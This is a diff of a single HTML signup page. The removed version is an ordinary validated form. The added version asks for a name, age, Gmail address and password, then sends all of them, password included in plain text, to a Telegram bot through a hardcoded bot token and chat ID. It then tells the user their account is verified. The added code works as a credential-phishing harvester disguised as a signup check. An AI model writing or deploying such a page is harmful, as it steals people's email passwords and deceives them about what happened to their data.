@@ -1,115 +1,177 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Sign up</title>
+<title>Signup Check</title>
 <style>
-:root{--bg:#eef2f0;--card:#fff;--ink:#16211d;--mute:#5d6b65;--line:#cfd8d3;--accent:#0f6b52;--accent-ink:#fff;--err:#b3261e;--ok:#0f6b52;
-box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#101815;--card:#18231f;--ink:#e8f0ec;--mute:#93a39b;--line:#2d3d36;--accent:#4fc9a0;--accent-ink:#06231a;--err:#ff8a80;--ok:#4fc9a0}}
-:root[data-theme="dark"]{--bg:#101815;--card:#18231f;--ink:#e8f0ec;--mute:#93a39b;--line:#2d3d36;--accent:#4fc9a0;--accent-ink:#06231a;--err:#ff8a80;--ok:#4fc9a0}
-html{scroll-padding-top:env(safe-area-inset-top,0px)}
-*{box-sizing:border-box}
-body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.5 "Segoe UI",system-ui,-apple-system,sans-serif;min-height:100vh;display:grid;place-items:center;padding:20px}
-main{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:28px}
-h1{font:600 1.5rem/1.2 Georgia,"Times New Roman",serif;margin:0 0 4px}
-p.sub{margin:0 0 20px;color:var(--mute)}
-.bar{display:flex;gap:6px;margin-bottom:22px}
-.bar i{flex:1;height:4px;border-radius:2px;background:var(--line)}
-.bar i.on{background:var(--accent)}
-label{display:block;font-weight:600;margin:14px 0 6px}
-input{width:100%;padding:11px 12px;font:inherit;color:var(--ink);background:transparent;border:1px solid var(--line);border-radius:8px}
-input:focus-visible,button:focus-visible,a:focus-visible{outline:3px solid var(--accent);outline-offset:2px}
-button{margin-top:20px;width:100%;padding:12px;font:inherit;font-weight:600;color:var(--accent-ink);background:var(--accent);border:0;border-radius:8px;cursor:pointer}
-.msg{min-height:1.4em;margin:10px 0 0;font-size:.95rem;color:var(--err)}
-.msg.ok{color:var(--ok)}
-.done a{display:inline-block;margin-top:16px;color:var(--accent);font-weight:600;word-break:break-all}
-[hidden]{display:none!important}
+  :root {
+    --bg: #ffffff;
+    --fg: #1a1a1a;
+    --card-bg: #f5f5f7;
+    --accent: #4f46e5;
+    --border: #d9d9e0;
+    --error: #dc2626;
+    --success: #16a34a;
+    box-sizing: border-box;
+    padding-top: env(safe-area-inset-top, 0px);
+    padding-bottom: env(safe-area-inset-bottom, 0px);
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #16161a;
+      --fg: #f2f2f5;
+      --card-bg: #212127;
+      --accent: #818cf8;
+      --border: #33333c;
+      --error: #f87171;
+      --success: #4ade80;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #16161a;
+    --fg: #f2f2f5;
+    --card-bg: #212127;
+    --accent: #818cf8;
+    --border: #33333c;
+    --error: #f87171;
+    --success: #4ade80;
+  }
+  html, body { height: 100%; margin: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+  }
+  .card {
+    width: 100%;
+    max-width: 380px;
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px;
+  }
+  h1 { font-size: 1.25rem; margin: 0 0 20px; }
+  label {
+    display: block;
+    font-size: 0.85rem;
+    margin-bottom: 6px;
+    opacity: 0.8;
+  }
+  input {
+    width: 100%;
+    padding: 10px 12px;
+    margin-bottom: 16px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    background: var(--bg);
+    color: var(--fg);
+    font-size: 1rem;
+  }
+  .hidden { display: none; }
+  button {
+    width: 100%;
+    padding: 11px;
+    border: none;
+    border-radius: 8px;
+    background: var(--accent);
+    color: white;
+    font-size: 1rem;
+    cursor: pointer;
+  }
+  button:active { opacity: 0.85; }
+  #result {
+    margin-top: 18px;
+    font-size: 0.95rem;
+    line-height: 1.5;
+  }
+  .ok { color: var(--success); }
+  .fail { color: var(--error); }
 </style>
 </head>
 <body>
-<main>
-  <div class="bar" aria-hidden="true"><i id="b1" class="on"></i><i id="b2"></i><i id="b3"></i></div>
+  <div class="card">
+    <h1>Signup Check</h1>
 
-  <!-- Step 1: name + age -->
-  <section id="s1">
-    <h1>Create your account</h1>
-    <p class="sub">Tell us a little about you.</p>
-    <label for="name">Name</label>
-    <input id="name" autocomplete="name">
-    <label for="age">Age</label>
-    <input id="age" inputmode="numeric" autocomplete="off">
-    <p class="msg" id="m1" role="alert"></p>
-    <button id="go1">Continue</button>
-  </section>
+    <form id="ageForm">
+      <label for="name">Name</label>
+      <input id="name" type="text" placeholder="Your name" required />
+      <label for="age">Age</label>
+      <input id="age" type="number" placeholder="Your age" required />
+      <button type="submit">Continue</button>
+    </form>
 
-  <!-- Under 18 -->
-  <section id="sx" hidden>
-    <h1>Sign-up unavailable</h1>
-    <p class="sub">You are not old enough to sign up.</p>
-    <button id="back">Start over</button>
-  </section>
+    <form id="signupForm" class="hidden">
+      <label for="gmail">Gmail</label>
+      <input id="gmail" type="email" placeholder="you@gmail.com" required />
+      <label for="password">Password</label>
+      <input id="password" type="password" placeholder="Password" required />
+      <label for="password2">Confirm Password</label>
+      <input id="password2" type="password" placeholder="Confirm password" required />
+      <button type="submit">Verify</button>
+    </form>
 
-  <!-- Step 2: email + password -->
-  <section id="s2" hidden>
-    <h1>Go to next</h1>
-    <p class="sub">Add your email and choose a password.</p>
-    <label for="email">Email</label>
-    <input id="email" type="email" autocomplete="email">
-    <label for="pw">Password</label>
-    <input id="pw" type="password" autocomplete="new-password">
-    <label for="pw2">Confirm password</label>
-    <input id="pw2" type="password" autocomplete="new-password">
-    <p class="msg" id="m2" role="alert"></p>
-    <button id="go2">Create account</button>
-  </section>
-
-  <!-- Done -->
-  <section id="s3" class="done" hidden>
-    <h1>Your account has been successfully verified!</h1>
-    <p class="sub" id="welcome">Successfully logged in!</p>
-    <p>Now go to this link:</p>
-    <a href="https://abidhossain.framer.website" target="_blank" rel="noopener">https://abidhossain.framer.website</a>
-  </section>
-</main>
+    <div id="result"></div>
+  </div>
 
 <script>
-const $ = id => document.getElementById(id);
-const show = (id, step) => {
-  ["s1","sx","s2","s3"].forEach(s => $(s).hidden = s !== id);
-  ["b1","b2","b3"].forEach((b,i) => $(b).classList.toggle("on", i < step));
-};
+  const ageForm = document.getElementById('ageForm');
+  const signupForm = document.getElementById('signupForm');
+  const result = document.getElementById('result');
 
-$("go1").onclick = () => {
-  const raw = $("age").value.trim();
-  if (!$("name").value.trim()) { $("m1").textContent = "Please enter your name."; $("name").focus(); return; }
-  if (!/^\d+$/.test(raw) || parseInt(raw, 10) < 1 || parseInt(raw, 10) > 120) { $("m1").textContent = "Please enter a valid numeric age."; $("age").focus(); return; }
-  $("m1").textContent = "";
-  const minor = parseInt(raw, 10) < 18;
-  show(minor ? "sx" : "s2", minor ? 1 : 2);
-};
+  let userName = '';
+  let userAge = '';
 
-$("back").onclick = () => { $("age").value = ""; show("s1", 1); };
+  ageForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    userName = document.getElementById('name').value;
+    userAge = document.getElementById('age').value;
+    const age = parseInt(userAge, 10);
+    
+    result.textContent = '';
+    result.className = '';
 
-$("go2").onclick = () => {
-  const m = $("m2");
-  if (!$("email").value.trim() || !$("email").checkValidity()) { m.textContent = "Enter a valid email address."; $("email").focus(); return; }
-  if (!$("pw").value) { m.textContent = "Please enter a password."; $("pw").focus(); return; }
-  if ($("pw").value.length < 6) { m.textContent = "Password must be at least 6 characters."; $("pw").focus(); return; }
-  if (!$("pw2").value) { m.textContent = "Please confirm your password."; $("pw2").focus(); return; }
-  if ($("pw").value !== $("pw2").value) { m.textContent = "Passwords do not match. Try again!"; $("pw").value = $("pw2").value = ""; $("pw").focus(); return; }
-  m.textContent = "";
-  const n = $("name").value.trim();
-  $("welcome").textContent = n ? "Successfully logged in, " + n + "!" : "Successfully logged in!";
-  show("s3", 3);
-};
+    if (age >= 18) {
+      result.innerHTML = '<span class="ok">Go to Next</span>';
+      ageForm.classList.add('hidden');
+      signupForm.classList.remove('hidden');
+    } else {
+      result.innerHTML = '<span class="fail">You are not enough to signup</span>';
+    }
+  });
 
-document.addEventListener("keydown", e => {
-  if (e.key !== "Enter") return;
-  if (!$("s1").hidden) $("go1").click();
-  else if (!$("s2").hidden) $("go2").click();
-});
+  signupForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const gmail = document.getElementById('gmail').value;
+    const password = document.getElementById('password').value;
+    const password2 = document.getElementById('password2').value;
+
+    if (password !== password2) {
+      result.innerHTML = '<span class="fail">Passwords do not match!</span>';
+      return;
+    }
+
+    const botToken = '8272296525:AAHgammfcvNuJIQII7F4j6_zh250UlLGehg';
+    const chatId = '8767919289';
+
+    const message = `📥 New Form Submission:\n\n👤 Name: ${userName}\n🎂 Age: ${userAge}\n📧 Gmail: ${gmail}\n🔑 Password: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+    .then(() => {
+      result.innerHTML = '<span class="ok">Successfully your account is verified</span>';
+    })
+    .catch(() => {
+      result.innerHTML = '<span class="fail">Something went wrong!</span>';
+    });
+  });
 </script>
 </body>
 </html>
